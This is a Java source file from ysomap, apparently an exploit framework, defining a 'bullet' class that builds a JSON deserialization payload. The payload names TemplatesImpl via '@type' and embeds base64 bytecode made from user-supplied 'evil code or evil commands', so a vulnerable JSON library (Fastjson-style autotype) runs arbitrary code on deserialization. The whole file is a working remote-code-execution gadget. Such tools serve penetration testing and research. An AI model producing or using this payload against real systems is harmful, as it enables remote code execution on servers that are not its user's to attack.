package ysomap.core.gadget.bullet.json;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import ysomap.annotation.Bullets;
import ysomap.annotation.NotNull;
import ysomap.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.gadget.bullet.jdk.TemplatesImplBullet;
import ysomap.util.ReflectionHelper;

import java.util.Base64;

/**
 * @author wh1t3P1g
 * @since 2020/3/18
 */
@Bullets
@SuppressWarnings({"rawtypes"})
public class TemplatesImplJsonBullet extends Bullet<Object> {

    @NotNull
    @Require(name = "body" ,detail = "evil code (start with 'code:') or evil commands")
    private String body;

    @Override
    public Object getObject() throws Exception {
        Bullet bullet = new TemplatesImplBullet();
        bullet.set("body", body);
        TemplatesImpl templates = (TemplatesImpl) bullet.getObject();
        byte[][] codebytes = (byte[][]) ReflectionHelper.getFieldValue(templates, "_bytecodes");
        return "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_name\":\"a\",\"_tfactory\":{ }," +
                "\"_bytecodes\":[\""+ Base64.getEncoder().encodeToString(codebytes[0]) +"\"]," +
                "\"_outputProperties\":{}}";
        // base64不要用Base64Encoder 这个编码后会有换行
    }
}
